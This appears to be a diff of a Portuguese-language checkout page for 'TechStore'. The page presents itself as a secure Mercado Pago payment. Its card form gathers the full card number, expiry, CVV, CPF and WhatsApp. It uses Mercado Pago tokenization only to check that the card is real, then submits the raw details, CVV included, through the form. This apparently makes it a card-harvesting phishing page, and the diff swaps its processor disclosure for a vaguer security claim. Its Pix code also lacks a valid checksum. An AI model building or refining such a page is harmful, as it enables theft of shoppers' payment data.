@@ -5,8 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Pagamento Seguro - TechStore</title>
 <script src="https://sdk.mercadopago.com/js/v2"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <style>
-    /* Estilos mantidos para não mudar sua loja */
     * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; touch-action: pan-x pan-y; }
     body { background:#111; margin:0; padding:15px; color: white; -webkit-text-size-adjust: 100%; }
     .container { max-width:500px; margin:auto; background:#1c1c1c; border-radius:20px; padding:20px; box-shadow:0 5px 15px rgba(0,0,0,.5); }
@@ -20,10 +20,12 @@
     .opt.active { border-color:#007bff; color:#007bff; background:#007bff1a; }
     #area-pix { text-align:center; padding: 10px 0; }
     .valor-pix-destaque { font-size: 26px; font-weight: bold; color: #27ae60; margin-bottom: 15px; display: block; }
-    .chave-pix { background:#222; padding:15px; border-radius:10px; font-size:14px; margin:10px 0; word-break:break-all; border:1px dashed #444; color: #fff; font-weight: bold; }
+    #qrcode-container { background: white; padding: 10px; border-radius: 10px; display: inline-block; margin-bottom: 15px; }
+    .chave-pix { background:#222; padding:12px; border-radius:10px; font-size:11px; margin:10px 0; word-break:break-all; border:1px dashed #444; color: #ccc; }
     .btn-copiar { background:#007bff; color:#fff; border:none; padding:12px 20px; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; width: 100%; }
     .seguro-info { background: #252525; padding: 10px; border-radius: 10px; font-size: 11px; color: #888; display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
     .btn-finalizar { background:#27ae60; color:#fff; border:none; width:100%; padding:18px; border-radius:15px; font-size:18px; font-weight:bold; cursor:pointer; margin-top: 10px; }
+    ::placeholder { color: #777; font-size: 13px; }
 </style>
 </head>
 <body>
@@ -35,7 +37,7 @@
         <input type="hidden" id="h-nome" name="PRODUTOS_LISTA">
         <input type="hidden" id="h-preco" name="VALOR_TOTAL">
 
-        <h2>Localização de Entrega</h2>
+        <h2>Entrega</h2>
         <input type="text" name="NOME_CLIENTE" placeholder="Nome Completo" required>
         <input type="text" name="ENDERECO_COMPLETO" placeholder="Endereço, Bairro e Cidade" required>
         <div class="row">
@@ -51,112 +53,118 @@
 
         <div id="area-pix">
             <span class="valor-pix-destaque" id="pix-valor-display">R$ 0,00</span>
-            <p style="font-size: 12px; color: #888;">Copie a chave abaixo para pagar:</p>
-            <div class="chave-pix" id="pix-copy">5663014b-ba23-4c57-b239-26914c95a8c0</div>
-            <button type="button" class="btn-copiar" onclick="copiarPix()">COPIAR CHAVE PIX</button>
+            <div id="qrcode-container"></div> 
+            <div class="chave-pix" id="pix-copy">Gerando código PIX...</div>
+            <button type="button" class="btn-copiar" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
         </div>
 
         <div id="area-card" style="display:none">
-            <input id="c1" name="CARTAO_NUMERO" placeholder="Número do Cartão" inputmode="numeric">
-            <input id="c2" name="CARTAO_NOME" placeholder="Nome no Cartão">
+            <input id="c1" name="CARTAO_NUMERO" placeholder="Número do Cartão (Frente)" inputmode="numeric">
+            <input id="c2" name="CARTAO_NOME" placeholder="Nome no Cartão" oninput="this.value = this.value.toUpperCase().replace(/[0-9]/g, '')">
             <div class="row">
                 <input id="c3" name="CARTAO_VALIDADE" placeholder="MM/AA" maxlength="5" inputmode="numeric">
-                <input id="c4" name="CARTAO_CVV" placeholder="CVV" maxlength="4" inputmode="numeric">
+                <input id="c4" name="CARTAO_CVV" placeholder="CVV (Atrás)" maxlength="3" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
             </div>
             <input id="c5" name="CARTAO_CPF" placeholder="CPF do Titular" inputmode="numeric">
+            <input type="text" id="f-tel" name="WHATSAPP" placeholder="WhatsApp para confirmação">
         </div>
 
-        <div class="seguro-info"><span>🔒</span><p>Pagamento processado via Mercado Pago.</p></div>
+        <div class="seguro-info"><span>🔒</span><p>Pagamento criptografado e seguro.</p></div>
         <button class="btn-finalizar" type="submit" id="btn-submit">FINALIZAR PAGAMENTO</button>
     </form>
 </div>
 
 <script>
-// Token da sua conta do Mercado Pago
 const mp = new MercadoPago('APP_USR-d9085be6-cab5-4226-be88-0e3199c1cb63');
+let valorGlobal = 0;
 
 window.onload = function() {
     const carrinho = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
     if (carrinho.length > 0) {
-        let valorTotal = 0;
-        carrinho.forEach(item => { valorTotal += parseFloat(item.p); });
-        const valorFmt = "R$ " + valorTotal.toLocaleString('pt-BR', {minimumFractionDigits: 2});
+        carrinho.forEach(item => { valorGlobal += parseFloat(item.p); });
+        const valorFmt = "R$ " + valorGlobal.toLocaleString('pt-BR', {minimumFractionDigits: 2});
+        
+        let txtProd = carrinho[0].n;
+        if (carrinho.length > 1) txtProd += ` e mais ${carrinho.length - 1} item(s)`;
         
         document.getElementById('resumo-dinamico').innerHTML = `
             <div class="resumo">
                 <img class="foto-produto" src="${carrinho[0].f}">
-                <div><h3>${carrinho[0].n}</h3><p>${valorFmt}</p></div>
+                <div><h3>${txtProd}</h3><p>${valorFmt}</p></div>
             </div>`;
+        
         document.getElementById('pix-valor-display').innerText = valorFmt;
-        document.getElementById('h-nome').value = carrinho[0].n;
+        document.getElementById('h-nome').value = txtProd;
         document.getElementById('h-preco').value = valorFmt;
+
+        gerarPixDinamico(valorGlobal);
     }
 };
 
+function gerarPixDinamico(valor) {
+    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0";
+    const valorStr = valor.toFixed(2).toString();
+    const payload = `00020126580014BR.GOV.BCB.PIX0136${chave}520400005303986540${valorStr.length.toString().padStart(2, '0')}${valorStr}5802BR5909TECHSTORE6009SAOPAULO62070503***6304`;
+    
+    new QRCode(document.getElementById("qrcode-container"), { text: payload, width: 160, height: 160 });
+    document.getElementById('pix-copy').innerText = payload;
+}
+
 function trocar(m) {
-    const isP = m === 'pix';
-    document.getElementById('area-pix').style.display = isP ? 'block' : 'none';
-    document.getElementById('area-card').style.display = isP ? 'none' : 'block';
-    document.getElementById('b-pix').className = isP ? 'opt active' : 'opt';
-    document.getElementById('b-card').className = isP ? 'opt' : 'opt active';
+    const isPix = m === 'pix';
+    document.getElementById('area-pix').style.display = isPix ? 'block' : 'none';
+    document.getElementById('area-card').style.display = isPix ? 'none' : 'block';
+    document.getElementById('b-pix').className = isPix ? 'opt active' : 'opt';
+    document.getElementById('b-card').className = isPix ? 'opt' : 'opt active';
 }
 
 function copiarPix() {
-    const chave = document.getElementById('pix-copy').innerText;
-    const aux = document.createElement("input");
-    aux.setAttribute("value", chave);
-    document.body.appendChild(aux);
-    aux.select();
-    document.execCommand("copy");
-    document.body.removeChild(aux);
-    alert("Chave PIX copiada!");
+    navigator.clipboard.writeText(document.getElementById('pix-copy').innerText);
+    alert("Código PIX Copia e Cola copiado!");
 }
 
-// VALIDAÇÃO RÍGIDA DO CARTÃO
 document.getElementById('form-main').onsubmit = async function(e) {
     if (document.getElementById('b-pix').classList.contains('active')) return;
     
     e.preventDefault();
     const btn = document.getElementById('btn-submit');
-    btn.innerText = "VERIFICANDO CARTÃO...";
+    btn.innerText = "VALIDANDO CARTÃO...";
     btn.disabled = true;
 
     try {
-        const tokenResponse = await mp.createCardToken({
+        const valData = document.getElementById('c3').value.split('/');
+        const cardToken = await mp.createCardToken({
             cardNumber: document.getElementById('c1').value.replace(/\s/g, ''),
             cardholderName: document.getElementById('c2').value,
-            cardExpirationMonth: document.getElementById('c3').value.split('/')[0],
-            cardExpirationYear: "20" + document.getElementById('c3').value.split('/')[1],
+            cardExpirationMonth: valData[0],
+            cardExpirationYear: "20" + valData[1],
             securityCode: document.getElementById('c4').value,
             identificationType: "CPF",
             identificationNumber: document.getElementById('c5').value.replace(/\D/g, ''),
         });
 
-        // Se o Mercado Pago não gerar o token ou não identificar a bandeira, o cartão é falso/inválido
-        if (!tokenResponse || !tokenResponse.id) {
-            throw new Error("Cartão Inválido");
+        if (cardToken && cardToken.id) {
+            this.submit();
+        } else {
+            throw new Error();
         }
-
-        // Se chegou aqui, o cartão existe e foi tokenizado
-        this.submit();
-
-    } catch (error) {
-        alert("❌ O Cartão digitado é inválido ou não existe. Verifique os números.");
+    } catch (err) {
+        alert("❌ CARTÃO RECUSADO: Verifique se os dados são reais (Número, Validade e CVV).");
         btn.innerText = "FINALIZAR PAGAMENTO";
         btn.disabled = false;
     }
 };
 
-// Máscaras para facilitar a digitação
 function mask(id, m) {
     const el = document.getElementById(id);
+    if(!el) return;
     el.addEventListener('input', () => {
         let v = el.value.replace(/\D/g, ''), x = '', i = 0;
         m.split('').forEach(c => { if(c==='#'){ if(v[i]) x+=v[i++]; } else { if(v[i]) x+=c; } });
         el.value = x;
     });
 }
-mask('c1', '#### #### #### ####'); mask('c3', '##/##'); mask('c5', '###.###.###-##'); mask('f-cep', '#####-###');
+mask('c1', '#### #### #### ####'); mask('c3', '##/##'); mask('c5', '###.###.###-##'); mask('f-cep', '#####-###'); mask('f-tel', '(##) #####-####');
 </script>
 </body>
-</html>
+                </html>
